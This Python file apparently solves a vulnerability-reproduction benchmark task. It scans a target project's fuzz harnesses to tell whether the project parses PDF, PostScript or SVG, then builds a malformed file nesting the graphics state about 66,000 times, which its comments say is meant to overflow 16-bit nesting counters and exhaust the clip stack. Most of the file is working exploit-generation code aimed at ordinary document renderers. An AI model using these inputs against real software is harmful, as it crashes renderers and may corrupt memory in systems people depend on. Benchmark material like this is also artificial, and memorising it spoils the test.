import os
import re
import io
import tarfile
import zipfile
import zlib
from typing import Iterator, Tuple, Optional


class Solution:
    def _iter_candidate_files_from_dir(self, root: str, max_size: int = 512_000) -> Iterator[Tuple[str, bytes]]:
        cand_ext = {
            ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx",
            ".m", ".mm", ".rs", ".go", ".java", ".kt", ".swift",
            ".py", ".js", ".ts", ".txt", ".md", ".yaml", ".yml",
            ".gn", ".gni", ".cmake", ".bazel", ".bzl", ".mk", ".in"
        }
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                p = os.path.join(dirpath, fn)
                try:
                    st = os.stat(p)
                except OSError:
                    continue
                if st.st_size <= 0 or st.st_size > max_size:
                    continue
                low = fn.lower()
                ext = os.path.splitext(low)[1]
                if ("fuzz" in low or "fuzzer" in low or "oss-fuzz" in low or "clusterfuzz" in low) or (ext in cand_ext):
                    try:
                        with open(p, "rb") as f:
                            yield os.path.relpath(p, root), f.read()
                    except OSError:
                        continue

    def _iter_candidate_files_from_tar(self, tar_path: str, max_size: int = 512_000) -> Iterator[Tuple[str, bytes]]:
        cand_ext = {
            ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx",
            ".m", ".mm", ".rs", ".go", ".java", ".kt", ".swift",
            ".py", ".js", ".ts", ".txt", ".md", ".yaml", ".yml",
            ".gn", ".gni", ".cmake", ".bazel", ".bzl", ".mk", ".in"
        }
        with tarfile.open(tar_path, "r:*") as tf:
            members = tf.getmembers()
            for m in members:
                if not m.isfile():
                    continue
                if m.size <= 0 or m.size > max_size:
                    continue
                name = m.name
                base = os.path.basename(name).lower()
                ext = os.path.splitext(base)[1]
                if ("fuzz" in base or "fuzzer" in base or "oss-fuzz" in base or "clusterfuzz" in base or "/fuzz" in name.lower()) or (ext in cand_ext):
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                        yield name, data
                    except Exception:
                        continue

    def _iter_candidate_files_from_zip(self, zip_path: str, max_size: int = 512_000) -> Iterator[Tuple[str, bytes]]:
        cand_ext = {
            ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx",
            ".m", ".mm", ".rs", ".go", ".java", ".kt", ".swift",
            ".py", ".js", ".ts", ".txt", ".md", ".yaml", ".yml",
            ".gn", ".gni", ".cmake", ".bazel", ".bzl", ".mk", ".in"
        }
        with zipfile.ZipFile(zip_path, "r") as zf:
            for zi in zf.infolist():
                if zi.is_dir():
                    continue
                if zi.file_size <= 0 or zi.file_size > max_size:
                    continue
                name = zi.filename
                base = os.path.basename(name).lower()
                ext = os.path.splitext(base)[1]
                if ("fuzz" in base or "fuzzer" in base or "oss-fuzz" in base or "clusterfuzz" in base or "/fuzz" in name.lower()) or (ext in cand_ext):
                    try:
                        data = zf.read(zi)
                        yield name, data
                    except Exception:
                        continue

    def _iter_candidate_files(self, src_path: str) -> Iterator[Tuple[str, bytes]]:
        if os.path.isdir(src_path):
            yield from self._iter_candidate_files_from_dir(src_path)
            return
        if tarfile.is_tarfile(src_path):
            yield from self._iter_candidate_files_from_tar(src_path)
            return
        if zipfile.is_zipfile(src_path):
            yield from self._iter_candidate_files_from_zip(src_path)
            return

    def _infer_input_kind(self, src_path: str) -> str:
        harness_texts = []
        other_texts = []
        max_collect = 200
        for name, data in self._iter_candidate_files(src_path):
            low = data.lower()
            if b"llvmfuzzertestoneinput" in low or b"fuzzertestoneinput" in low:
                harness_texts.append(low[:400_000])
            else:
                other_texts.append(low[:200_000])
            if len(harness_texts) + len(other_texts) >= max_collect:
                break

        blob = b"\n".join(harness_texts if harness_texts else other_texts)
        if not blob:
            return "pdf_doc"

        def cnt(x: bytes) -> int:
            return blob.count(x)

        pdf_doc_score = (
            (10 if b"%pdf" in blob else 0) +
            cnt(b"pdf_load") + cnt(b"pdf_open") + cnt(b"pdfium") + cnt(b"mupdf") + cnt(b"poppler") +
            cnt(b"fpdf_") + cnt(b"pdfdoc") + cnt(b"cpdf") + cnt(b"pdfparser") + cnt(b"pdf") +
            (5 if b"flatedecode" in blob else 0)
        )
        pdf_stream_score = (
            cnt(b"content stream") + cnt(b"parse_stream") + cnt(b"parsecontent") + cnt(b"contentstream") +
            cnt(b"operator") + cnt(b"postscript operator") + cnt(b"pdf_operator")
        )
        ps_score = (
            cnt(b"postscript") + cnt(b"ghostscript") + cnt(b"ps_interpret") + cnt(b"eps") +
            cnt(b"gsave") + cnt(b"grestore") + cnt(b"showpage") + cnt(b"%!ps")
        )
        svg_score = cnt(b"svg") + cnt(b"librsvg") + cnt(b"usvg") + cnt(b"svgtiny") + (5 if b"<svg" in blob else 0)

        # Prefer PDF document if clearly indicated.
        if pdf_doc_score >= max(ps_score, svg_score) + 3:
            # If it seems like they fuzz a content-stream parser, consider raw stream.
            if pdf_stream_score > 10 and (b"%pdf" not in blob) and (cnt(b"loadmemdocument") == 0) and (cnt(b"pdf_open_document") == 0):
                return "pdf_stream"
            return "pdf_doc"

        if ps_score >= max(pdf_doc_score, svg_score) + 3:
            return "ps"

        if svg_score >= max(pdf_doc_score, ps_score) + 3:
            return "svg"

        # Default to PDF document, most common for clip-stack issues without deep XML recursion.
        return "pdf_doc"

    def _build_pdf(self, content_stream: bytes, use_flate: bool = True) -> bytes:
        if use_flate:
            compressed = zlib.compress(content_stream, 9)
            stream_dict = b"<< /Length " + str(len(compressed)).encode("ascii") + b" /Filter /FlateDecode >>"
            stream_bytes = compressed
        else:
            stream_dict = b"<< /Length " + str(len(content_stream)).encode("ascii") + b" >>"
            stream_bytes = content_stream

        parts = []
        parts.append(b"%PDF-1.4\n%\xFF\xFF\xFF\xFF\n")
        offsets = [0] * 5  # 0..4

        def add_obj(n: int, body: bytes):
            offsets[n] = sum(len(p) for p in parts)
            parts.append(str(n).encode("ascii") + b" 0 obj\n")
            parts.append(body)
            if not body.endswith(b"\n"):
                parts.append(b"\n")
            parts.append(b"endobj\n")

        add_obj(1, b"<< /Type /Catalog /Pages 2 0 R >>\n")
        add_obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n")
        add_obj(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Contents 4 0 R /Resources << >> >>\n")

        obj4 = bytearray()
        obj4 += stream_dict + b"\nstream\n"
        obj4 += stream_bytes
        if not obj4.endswith(b"\n"):
            obj4 += b"\n"
        obj4 += b"endstream\n"
        add_obj(4, bytes(obj4))

        xref_off = sum(len(p) for p in parts)
        xref = io.BytesIO()
        xref.write(b"xref\n")
        xref.write(b"0 5\n")
        xref.write(b"0000000000 65535 f \n")
        for i in range(1, 5):
            xref.write(f"{offsets[i]:010d} 00000 n \n".encode("ascii"))
        xref.write(b"trailer\n")
        xref.write(b"<< /Size 5 /Root 1 0 R >>\n")
        xref.write(b"startxref\n")
        xref.write(str(xref_off).encode("ascii") + b"\n")
        xref.write(b"%%EOF\n")
        parts.append(xref.getvalue())
        return b"".join(parts)

    def _build_ps(self, n: int) -> bytes:
        # Many gsaves, then a clipping path, to force clip-stack use at high depth.
        # Keep it simple and mostly ASCII.
        # Some interpreters require a path before clip; we provide it once at the end.
        body = bytearray()
        body += b"%!PS-Adobe-3.0\n"
        # Push graphics state depth.
        body += b"0 0 moveto 10 0 lineto 10 10 lineto 0 10 lineto closepath\n"
        body += (b"gsave\n" * n)
        body += b"clip\nnewpath\n"
        body += b"showpage\n"
        return bytes(body)

    def _build_svg(self, n: int) -> bytes:
        # Warning: deep nesting can cause recursion stack issues in many renderers.
        # Keep n modest here, but still try to exceed common limits.
        n = min(n, 8000)
        header = b'<?xml version="1.0" encoding="UTF-8"?>\n'
        svg_open = b'<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">\n'
        defs = b'<defs><clipPath id="c"><rect x="0" y="0" width="10" height="10"/></clipPath></defs>\n'
        g_open = b'<g clip-path="url(#c)">\n'
        g_close = b'</g>\n'
        tail = b'</svg>\n'
        return header + svg_open + defs + (g_open * n) + b'<rect x="0" y="0" width="1" height="1"/>\n' + (g_close * n) + tail

    def solve(self, src_path: str) -> bytes:
        kind = self._infer_input_kind(src_path)

        # Depth chosen to exceed both int16 and uint16 nesting counters.
        n = 66000

        if kind == "ps":
            return self._build_ps(n)

        if kind == "svg":
            return self._build_svg(n)

        # PDF content stream designed to create huge graphics-state nesting, then push a clip.
        content = (b"q\n" * n) + b"0 0 m 0 10 l 10 10 l 10 0 l h\nW n\n"

        if kind == "pdf_stream":
            return content

        # For PDF document, prefer Flate if the codebase likely supports it.
        # Heuristic: many PDF libs do; but if tarball/harness doesn't mention it, still use it (size win).
        use_flate = True
        return self._build_pdf(content, use_flate=use_flate)